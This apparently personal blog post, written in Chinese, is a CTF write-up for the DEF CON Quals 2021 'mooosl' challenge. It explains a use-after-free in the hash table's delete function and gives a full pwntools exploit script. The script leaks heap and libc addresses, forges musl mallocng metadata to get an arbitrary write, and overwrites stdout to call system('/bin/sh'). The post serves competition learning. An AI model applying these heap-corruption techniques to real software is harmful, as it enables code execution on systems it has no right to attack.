---
layout: post
title: "2021 defcon quals mooosl wp"
date:   2022-5-6
tags: [ctf_wp]
comments: true
author: wsxk
---

- [漏洞分析](#漏洞分析)
- [如何利用](#如何利用)
- [exp效果](#exp效果)
- [exp](#exp)
- [参考](#参考)





## 漏洞分析

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-5-6-defcon_2021_quals_mooosl/1.png)

heap_array是存放若干个单向链表的数组，每个单向链表里存放着 （key经过hash得到的值）低12位相同chunk

漏洞点在 delete函数里，当两个hash低12位相同的时候，是放在heap_array同一个位置的，此时释放后面一个，前面一个chunk仍然存放指向后面一个chunk的指针，相当于uaf

## 如何利用

1.首先要想能利用这个uaf，需要chunk（定义为origin）的value地址 在该chunk地址前（这样在chunk 回收利用时，value是一个新chunk，而origin还没有被使用，这样的话可以通过query功能泄露信息（可以多次利用这个功能达到泄露很多信息），相当于任意地址读

2.这道题没有其他功能了，需要你伪造meta_arena（伪造meta_arena时要注意地址的低12位必须是0，一般用mmap，即申请大于4096的内存）,meta和group来利用dequeue和queue来完成任意地址写

3.用FSOP来进行攻击，这个很简单，只有能申请chunk到这个位置，你随便写都能getshell，覆盖stdout->write函数指针为system，在stdout->flags写入/bin/sh\x00，并且保证stdin->wpos != stdin->wbase就行。

思路很简单，过程很辛苦。

## exp效果

![](https://raw.githubusercontent.com/wsxk/wsxk_pictures/main/2022-5-6-defcon_2021_quals_mooosl/2.png)

## exp

这里用了我自己编译的libc（调试方便，改成题目的libc需要改偏移，太麻烦了就不改了，笑

        from pwn import *

        context.log_level='debug'
        io = process('./mooosl')
        libc = ELF("./libc_true.so")

        def store(key,key_size,value,value_size):
            io.sendlineafter("option: ",str(1))
            io.sendlineafter("key size: ",str(key_size))
            io.sendafter("key content: ",key)
            io.sendlineafter("value size: ",str(value_size))
            io.sendafter("value content: ",value)

        def query(key,key_size):
            io.sendlineafter("option: ",str(2))
            io.sendlineafter("key size: ",str(key_size))
            io.sendafter("key content: ",key)
            
        def delete(key,key_size):
            io.sendlineafter("option: ",str(3))
            io.sendlineafter("key size: ",str(key_size))
            io.sendafter("key content: ",key)  


        # Brute force two-byte keys that end up in the same 'bucket'
        # of the hash table (buckets are 0 to 4095)
        START = (0x7e5)
        def brute_force_collision(desired_bucket, cur_num=START):
            options = []
            for x in range(256):
                for y in range(256):
                    cur_num = START
                    cur_num = ((x + cur_num * 0x13377331))
                    cur_num = ((y + cur_num * 0x13377331))
                    if (cur_num & 0xfff) == desired_bucket:
                        options.append((x, y))
            return options

        ## get same bucket
        collisions = brute_force_collision(255)
        print(collisions)
        usage=[]
        for each in collisions:
            usage.append(bytes(each))
        print(usage)

        #-------------- leak libc,mmap base and so on...-----------------------
        # 0x30 has 7 chunks
        store(b'a',1,b'a',1)
        store(b'b',1,b'b',1)
        #gdb.attach(io)
        for i in range(5):
            query((i+48).to_bytes(1,'little')*0x30,0x30)
        #gdb.attach(io)
        store(usage[0],len(usage[0]), b'A' * 0x30,0x30)
        #gdb.attach(io)
        store(usage[1],len(usage[1]),b'B'*0x30,0x30)
        #gdb.attach(io)
        delete(usage[0],len(usage[0]))

        for i in range(2):
            query((i+48).to_bytes(1,'little')*0x30,0x30)
        store(b'aa',2,b'c'*0x1200,0x1200)
        #gdb.attach(io)
        query(usage[0],len(usage[0]))
        io.recvuntil(":")
        addr = io.recv(16)
        true_addr = addr[14:16]+addr[12:14]+addr[10:12]+addr[8:10]+addr[6:8]+addr[4:6]+addr[2:4]+addr[0:2]
        chunk_addr = int(true_addr,16)-0x80 #actvie[0]->group addr
        addr = io.recv(16)
        true_addr = addr[14:16]+addr[12:14]+addr[10:12]+addr[8:10]+addr[6:8]+addr[4:6]+addr[2:4]+addr[0:2]
        mmap_base =int(true_addr,16)-0x20 #0x1200 mmap base 

        print("chunk_addr:"+hex(chunk_addr))
        print("mmap_base:"+hex(mmap_base))

        for i in range(2):
            query((i+48).to_bytes(1,'little')*0x30,0x30)
        query(p64(chunk_addr+0x50)+p64(chunk_addr)+p64(2)+p64(0x30)+p64(0x0000000014d6c0ff)+p64(0),0x30) # usage[0] -> chunk
        query(usage[0],len(usage[0]))
        io.recvuntil(":")
        addr = io.recv(16)
        true_addr = addr[14:16]+addr[12:14]+addr[10:12]+addr[8:10]+addr[6:8]+addr[4:6]+addr[2:4]+addr[0:2]
        heap_base = int(true_addr,16)-0x1a8
        print("heap_base:"+hex(heap_base))

        for i in range(2):
            query((i+48).to_bytes(1,'little')*0x30,0x30)
        query(p64(chunk_addr+0x50)+p64(heap_base+0xf0)+p64(2)+p64(0x10)+p64(0x0000000014d6c0ff)+p64(0),0x30) # usage[0] -> chunk
        query(usage[0],len(usage[0]))
        io.recvuntil(":")
        addr = io.recv(16)
        true_addr = addr[14:16]+addr[12:14]+addr[10:12]+addr[8:10]+addr[6:8]+addr[4:6]+addr[2:4]+addr[0:2]
        libc.address = int(true_addr,16)-0x9e0a0-0x15000
        print("libc.addr:"+hex(libc.address))

        for i in range(2):
            query((i+48).to_bytes(1,'little')*0x30,0x30)
        query(p64(chunk_addr+0x50)+p64(heap_base)+p64(2)+p64(0x10)+p64(0x0000000014d6c0ff)+p64(0),0x30) # usage[0] -> chunk
        query(usage[0],len(usage[0]))
        io.recvuntil(":")
        addr = io.recv(16)
        true_addr = addr[14:16]+addr[12:14]+addr[10:12]+addr[8:10]+addr[6:8]+addr[4:6]+addr[2:4]+addr[0:2]
        secret = int(true_addr,16)
        print("secret:"+hex(secret))

        print("---------------------------------------------------------")
        print("now all info we need is ok!")
        print(" ")
        print("chunk_addr:"+hex(chunk_addr)) #active[0]-> group addr
        print("mmap_base:"+hex(mmap_base)) #0x1200 position
        print("heap_base:"+hex(heap_base)) # meta_arena
        print("secret:"+hex(secret))
        print("libc.addr:"+hex(libc.address))

        #-------------- musl unlink ----> FSOP-----------------
        stout = libc.address +0xB02E0
        fake_meta_addr = mmap_base + 0x2010
        fake_mem_addr = mmap_base + 0x2040
        ## dequeue
        sc = 8 # 0x80
        freeable = 1
        last_idx = 0
        maplen = 1
        fake_meta = b''
        fake_meta += p64(stout - 0x18) # prev
        fake_meta += p64(fake_meta_addr + 0x30) # next
        fake_meta += p64(fake_mem_addr) # mem
        fake_meta += p32(0) + p32(0) # avail_mask, freed_mask
        fake_meta += p64((maplen << 12) | (sc << 6) | (freeable << 5) | last_idx)
        fake_meta += p64(0)

        fake_mem = b''
        fake_mem += p64(fake_meta_addr) # meta
        fake_mem += p32(1) # active_idx
        fake_mem += p32(0)

        payload = b''
        payload += b'A' * 0xaa0
        payload += p64(secret) + p64(0)
        payload += fake_meta
        payload += fake_mem
        payload += b'\n'

        for i in range(1):
            query((i+48).to_bytes(1,'little')*0x30,0x30)
        query(payload,0x1200)
        store(usage[0]+b'\x00'+b'0',0x4,p64(chunk_addr+0xd0)+p64(fake_mem_addr+0x10)+p64(2)+p64(0x20)+p64(0x0000000014d6c0ff)+p64(0),0x30)
        log.info('fake_meta_addr: %#x' % fake_meta_addr)
        log.info('fake_mem_addr: %#x' % fake_mem_addr)
        log.info('stdout: %#x' % stout)
        #gdb.attach(io)
        delete(usage[0],len(usage[0]))
        #gdb.attach(io)

        # Create a fake bin using enqueue during free
        sc = 8 # 0x90
        last_idx = 1
        fake_meta = b''
        fake_meta += p64(0) # prev
        fake_meta += p64(0) # next
        fake_meta += p64(fake_mem_addr) # mem
        fake_meta += p32(0) + p32(0) # avail_mask, freed_mask
        fake_meta += p64((sc << 6) | last_idx)
        fake_meta += p64(0)

        fake_mem = b''
        fake_mem += p64(fake_meta_addr) # meta
        fake_mem += p32(1) # active_idx
        fake_mem += p32(0)

        payload = b''
        payload += b'A' * 0xa90
        payload += p64(secret) + p64(0)
        payload += fake_meta
        payload += fake_mem
        payload += b'\n'

        # for i in range(1):
        #     query((i+48).to_bytes(1,'little')*0x30,0x30)
        query(payload,0x1200)
        store(usage[0]+b'\x00'+b'0',0x4,p64(chunk_addr+0xf0)+p64(fake_mem_addr+0x10)+p64(2)+p64(0x20)+p64(0x0000000014d6c0ff)+p64(0),0x30)
        #gdb.attach(io)
        delete(usage[0],len(usage[0]))
        #gdb.attach(io)

        # Overwrite the fake bin so that it points to stdout
        fake_meta = b''

        fake_meta += p64(fake_meta_addr) # prev
        fake_meta += p64(fake_meta_addr) # next
        fake_meta += p64(stout - 0x10) # mem
        fake_meta += p32(1) + p32(0) # avail_mask, freed_mask
        fake_meta += p64((sc << 6) | last_idx)
        fake_meta += b'A' * 0x18
        fake_meta += p64(stout - 0x10)

        payload = b''
        payload += b'A' * 0xa80
        payload += p64(secret) + p64(0)
        payload += fake_meta
        payload += b'\n'
        #gdb.attach(io)
        query(payload, 0x1200)
        #gdb.attach(io)
        # Call calloc(0x80) which returns stdout and call system("/bin/sh") by overwriting vtable
        #fake_stdout = b'E;sh;'.ljust(0x10, b'\x00')+p64(0)*7+p64(system)*2+p64(fake_meta_addr+0x80)+p64(0)*3+p64(1)+p64(0)
        payload = b''
        payload += b'/bin/sh\x00'
        payload += b'A' * 0x20
        payload += p64(heap_base)
        payload += b'A' * 8
        payload += p64(heap_base)
        payload += b'A' * 8
        payload += p64(libc.symbols['system'])
        payload += b'A' * 0x3c
        payload += p32((1<<32)-1)
        #payload = b'E;sh;'.ljust(0x10, b'\x00')+p64(0)*7+p64(libc.sym['system'])*2+p64(fake_meta_addr+0x80)+p64(0)*3+p64(1)+p64(0)
        #store(b'f',0x1, payload,0x80)
        gdb.attach(io)

        io.sendlineafter("option: ",str(1))
        io.sendlineafter("key size: ",str(1))
        io.sendafter("key content: ",'f')
        io.sendlineafter("value size: ",str(0x80))
        io.sendline(payload)

        io.interactive()


## 参考

[借助DefCon Quals 2021的mooosl学习musl mallocng（漏洞利用篇）](https://www.anquanke.com/post/id/241104#h2-1)

[https://github.com/Kyle-Kyle/blog/blob/ce96da2540e940a53459e57d615de78cda5208f7/writeups/defcon21_mooosl/solve.py](https://github.com/Kyle-Kyle/blog/blob/ce96da2540e940a53459e57d615de78cda5208f7/writeups/defcon21_mooosl/solve.py)

[https://github.com/cscosu/ctf-writeups/tree/master/2021/def_con_quals/mooosl](https://github.com/cscosu/ctf-writeups/tree/master/2021/def_con_quals/mooosl)


<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-C22S5YSYL7"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-C22S5YSYL7');
</script>